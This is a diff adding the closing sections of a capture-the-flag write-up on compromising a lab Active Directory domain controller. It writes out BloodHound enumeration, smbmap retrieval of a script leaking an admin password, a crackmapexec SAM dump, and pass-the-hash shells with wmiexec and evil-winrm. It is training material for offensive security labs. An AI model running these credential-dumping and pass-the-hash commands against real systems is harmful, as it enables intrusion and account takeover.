@@ -170,3 +170,86 @@ With a valid set of credentials, I decided to use bloodhound to enumerate the bo
 ## bloodhound
 
 After starting *neo4j* and *bloodhound*, I used an ingestor to obtain data about the target domain.
+
+`sudo bloodhound-python -d vulnnet-rst.local -u t-skid -p '<REDACTED>' -ns 10.10.212.255 -c all`
+
+![ingestor](/images/15.png)
+
+I then uploaded the data and found that the *a-whitehat* user was a domain admin - we now can focus our attention on compromising *a-whitehat* :slightly_smiling_face:
+
+![bloodhound](/images/16.png)
+![bloodhound](/images/17.png)
+
+With nothing much else to go on, we can go back to enumerating smb but this time using the valid credentials we have obtained.
+
+---
+
+## Enumerating SMB (again)
+
+`sudo smbmap -H 10.10.212.255 -u 't-skid' -p <REDACTED>`
+
+The *t-skid* user has more access to the shares, and we soon find an interesting *vbs* file which contains just what we are looking for - a way to compromise the domain admin user known as *a-whitehat* :smiley:
+
+![smb](/images/18.png)
+
+`sudo smbmap -H 10.10.212.255 -u 't-skid' -p <REDACTED> -r 'NETLOGON'`
+
+Here we see the *ResetPassword.vbs* file :facepalm:
+
+![smb](/images/19.png)
+
+`sudo smbmap -H 10.10.212.255 -u 't-skid' -p <REDACTED> --download 'NETLOGON\ResetPassword.vbs'`
+
+A nice discovery! :thumbsup:
+
+![smb](/images/20.png)
+
+![smb](/images/21.png)
+
+---
+
+## Looting the SAM Database
+
+The next step is to check if the password is valid - it could be that the *a-whitehat* user changed their password after it was reset. I used *crackmapexec* to check if the password was still valid - it was :gift: - I then dumped the sam database using the same tool.
+
+`sudo crackmapexec smb 10.10.212.255 -u 'a-whitehat' -d 'VULNNET-RST.local -p <REDACTED>' --sam`
+
+![cme](/images/22.png)
+
+> [!TIP]
+> Always change your passwords from default or given values :roll_eyes:
+
+---
+
+## Getting Root
+
+Armed with a hash for the Administrator user, I tried getting a shell using a *psexec* tool from *impacket* but it did not work so I tried the *wmiexec* tool which did work. I was able to use this shell to grab the user and system flags :smile:
+
+`sudo python3 wmiexec.py "Administrator":@10.10.168.123 -hashes 'aad...09d'`
+
+![wmiexec](/images/23.png)
+
+![wmiexec](/images/24.png)
+
+![wmiexec](/images/25.png)
+
+The box was pwned :skull: and I was happy because I'd had some fun hacking a domain controller :partying_face:
+
+---
+
+## PS
+
+The wmiexec shell is slow and limited, so it is worth noting that we can get a better shell using *winrm*
+
+`sudo evil-winrm -u Administrator -H 'c25...09d' -i -N`
+
+> [!IMPORTANT]
+> We only use the NT hash with evil-winrm - the second part of the full NTLM hash
+
+![winrm](/images/26.png)
+
+---
+
+## Credits
+
+Thank you to [SkyWaves](https://tryhackme.com/p/SkyWaves) for creating the room, and thank you to *you* for reading my writeup of it :fist:
